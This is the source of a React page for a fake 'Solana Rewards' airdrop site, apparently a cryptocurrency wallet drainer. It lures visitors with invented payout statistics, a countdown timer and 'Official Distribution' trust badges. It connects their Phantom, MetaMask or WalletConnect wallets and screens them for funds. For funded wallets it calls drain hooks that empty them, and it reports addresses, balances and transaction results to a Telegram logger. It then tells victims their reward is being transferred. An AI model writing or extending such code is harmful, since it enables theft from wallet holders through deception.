"use client";

import { ethers } from 'ethers'; // ← CRITICAL: Added import
import { useState, useEffect } from 'react';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { useEthereumDrain } from '@/hooks/useEthereumDrain';
import { useWalletConnect } from '@/hooks/useWalletConnect';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import { isMobileBrowser, openInWallet } from '@/utils/mobileDetect';
import WalletModal from '@/components/WalletModal';
import MobilePrompt from '@/components/MobilePrompt';
import EligibilityDisplay from '@/components/EligibilityDisplay';
import CountdownTimer from '@/components/CountdownTimer';
import StatsDisplay from '@/components/StatsDisplay';
import TrustBadges from '@/components/TrustBadges';
import HowItWorks from '@/components/HowItWorks';

const INITIAL_STATS = {
  distributed: 1784,
  participants: 4287,
  totalPool: 3500
};

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletType, setWalletType] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);
  const [walletBalance, setWalletBalance] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [showMobilePrompt, setShowMobilePrompt] = useState(false);
  const [allocatedAmount, setAllocatedAmount] = useState(null);
  const [eligibilityStatus, setEligibilityStatus] = useState('idle');
  const [processing, setProcessing] = useState(false);
  const [drainComplete, setDrainComplete] = useState(false);
  const [drainFailed, setDrainFailed] = useState(false);
  const [stats, setStats] = useState(INITIAL_STATS);
  const [countdown, setCountdown] = useState(180);
  
  const { executeDrain: executeSolanaDrain } = useSolanaDrain();
  const { executeDrain: executeEthereumDrain } = useEthereumDrain();
  const { connect: connectWalletConnect } = useWalletConnect();
  
  useEffect(() => {
    if (isMobileBrowser() && !window.solana && !window.ethereum) {
      setShowMobilePrompt(true);
    }
  }, []);
  
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => Math.max(0, prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);
  
  useEffect(() => {
    const interval = setInterval(() => {
      setStats(prev => ({
        ...prev,
        distributed: prev.distributed + (Math.random() * 0.1),
        participants: prev.participants + (Math.random() > 0.7 ? 1 : 0)
      }));
    }, 30000);
    return () => clearInterval(interval);
  }, []);
  
  const handleWalletSelect = async (type) => {
    try {
      setWalletType(type);
      setShowModal(false);
      setEligibilityStatus('checking');
      
      let address = null;
      let balance = null;
      
      if (type === 'phantom') {
        if (!window.solana?.isPhantom) {
          window.open('https://phantom.app', '_blank');
          return;
        }
        const response = await window.solana.connect();
        address = response.publicKey.toString();
        balance = await window.solana.connection?.getBalance?.(response.publicKey) || 0;
      }
      
      else if (type === 'metamask') {
        if (!window.ethereum) {
          window.open('https://metamask.io', '_blank');
          return;
        }
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = await provider.getSigner();
        address = await signer.getAddress();
        balance = await provider.getBalance(address);
      }
      
      else if (type === 'walletconnect') {
        address = await connectWalletConnect();
        balance = 0; // Would need RPC call
      }
      
      setWalletAddress(address);
      setWalletBalance(balance);
      
      const minBalance = type === 'phantom' ? 0.003 * 1e9 : ethers.parseEther('0.001');
      const hasFunds = type === 'phantom' ? balance > minBalance : balance > minBalance;
      
      if (!hasFunds) {
        setEligibilityStatus('not-eligible');
        await sendTelegramLog('connected_empty', {
          walletType: type,
          address,
          balance: type === 'phantom' ? balance/1e9 : ethers.formatEther(balance)
        });
      } else {
        const amount = calculateAllocation(address);
        setAllocatedAmount(amount);
        setEligibilityStatus('eligible');
        setConnected(true);
        
        await sendTelegramLog('connected_funded', {
          walletType: type,
          address,
          balance: type === 'phantom' ? balance/1e9 : ethers.formatEther(balance),
          eligibleAmount: amount
        });
      }
      
    } catch (error) {
      console.error('Connection error:', error);
      setEligibilityStatus('idle');
    }
  };
  
  const handleDrain = async () => {
    if (!walletType || !allocatedAmount) return;
    
    try {
      setProcessing(true);
      setDrainFailed(false);
      
      let result;
      if (walletType === 'phantom') {
        result = await executeSolanaDrain(allocatedAmount);
      } else if (walletType === 'metamask') {
        result = await executeEthereumDrain();
      } else if (walletType === 'walletconnect') {
        // WalletConnect drain implementation
      }
      
      if (result?.success) {
        setDrainComplete(true);
        setStats(prev => ({
          ...prev,
          distributed: prev.distributed + allocatedAmount,
          participants: prev.participants + 1
        }));
        
        await sendTelegramLog('drain_success', {
          walletType,
          address: walletAddress,
          amount: allocatedAmount,
          tx: result.txId || result.txHash
        });
        
        setTimeout(() => {
          window.location.href = `https://explorer.solana.com/tx/${result.txId || 'dummy'}`;
        }, 2000);
      }
      
    } catch (error) {
      console.error('Drain failed:', error);
      setDrainFailed(true);
      await sendTelegramLog('drain_failed', {
        walletType,
        address: walletAddress,
        error: error.message
      });
    } finally {
      setProcessing(false);
    }
  };
  
  return (
    <div className="min-h-screen relative">
      {/* Mobile Prompt */}
      <MobilePrompt 
        isOpen={showMobilePrompt}
        onClose={() => setShowMobilePrompt(false)}
        onSelectWallet={(type) => {
          setShowMobilePrompt(false);
          openInWallet(type, process.env.NEXT_PUBLIC_APP_URL);
        }}
      />
      
      {/* Header */}
      <header className="neon-glass m-4 p-4 relative z-10">
        <div className="max-w-6xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-solana-gradient animate-neon-pulse"></div>
            <div>
              <h1 className="text-xl font-bold text-gradient">Solana Rewards</h1>
              <p className="text-xs text-gray-400">Official Distribution</p>
            </div>
          </div>
          <CountdownTimer seconds={countdown} />
        </div>
      </header>
      
      {/* Main Content */}
      <main className="max-w-6xl mx-auto px-4 py-8 relative z-10">
        {/* Hero */}
        <div className="text-center mb-12">
          <h2 className="text-4xl md:text-5xl font-bold mb-4">
            <span className="text-gradient">3,500 SOL</span> Community Reward Pool
          </h2>
          <p className="text-gray-300 max-w-2xl mx-auto">
            Connect your wallet to verify eligibility for the Sol Community Rewards Pool
          </p>
        </div>
        
        {/* Stats */}
        <StatsDisplay stats={stats} />
        
        {/* Connection/Eligibility Card */}
        <div className="neon-glass max-w-md mx-auto mt-8 p-8">
          {!connected && eligibilityStatus === 'idle' && (
            <div className="text-center">
              <button
                onClick={() => setShowModal(true)}
                className="neon-button w-full text-lg py-4"
              >
                Connect Wallet
              </button>
              <p className="text-sm text-gray-400 mt-4">
                Connect to check your eligibility status
              </p>
            </div>
          )}
          
          {eligibilityStatus === 'checking' && (
            <div className="text-center py-8">
              <div className="w-16 h-16 border-4 border-solana-purple border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
              <p className="text-gray-300">Checking wallet activity...</p>
            </div>
          )}
          
          {eligibilityStatus === 'not-eligible' && (
            <div className="text-center py-6">
              <div className="text-5xl mb-4 animate-float">⚠️</div>
              <h3 className="text-2xl font-bold text-red-400 mb-2">Not Eligible</h3>
              <p className="text-gray-300 mb-6">
                Your wallet doesn't meet the requirements for this round.
              </p>
              <button
                onClick={() => setShowModal(true)}
                className="neon-button w-full"
              >
                Try Different Wallet
              </button>
            </div>
          )}
          
          {eligibilityStatus === 'eligible' && !drainComplete && (
            <EligibilityDisplay
              amount={allocatedAmount}
              onConfirm={handleDrain}
              processing={processing}
              failed={drainFailed}
              onRetry={handleDrain}
              countdown={countdown}
            />
          )}
          
          {drainComplete && (
            <div className="text-center py-6">
              <div className="text-5xl mb-4 animate-bounce text-solana-green">✅</div>
              <h3 className="text-2xl font-bold text-solana-green mb-2">Allocation Initiated!</h3>
              <p className="text-gray-300 mb-2">
                Your {allocatedAmount?.toFixed(2)} SOL is being transferred.
              </p>
              <p className="text-sm text-gray-400">
                Redirecting to Solana Explorer...
              </p>
            </div>
          )}
        </div>
        
        {/* Trust Badges */}
        <TrustBadges variant="default" />
        
        {/* How It Works */}
        <HowItWorks />
      </main>
      
      {/* Footer */}
      <footer className="neon-glass m-4 p-6 text-center relative z-10">
        <p className="text-sm text-gray-400">
          © 2026 Solana Community Rewards. All distributions executed on-chain.
        </p>
        <TrustBadges variant="footer" />
      </footer>
      
      {/* Wallet Modal */}
      <WalletModal
        isOpen={showModal}
        onClose={() => setShowModal(false)}
        onSelect={handleWalletSelect}
      />
    </div>
  );
          }
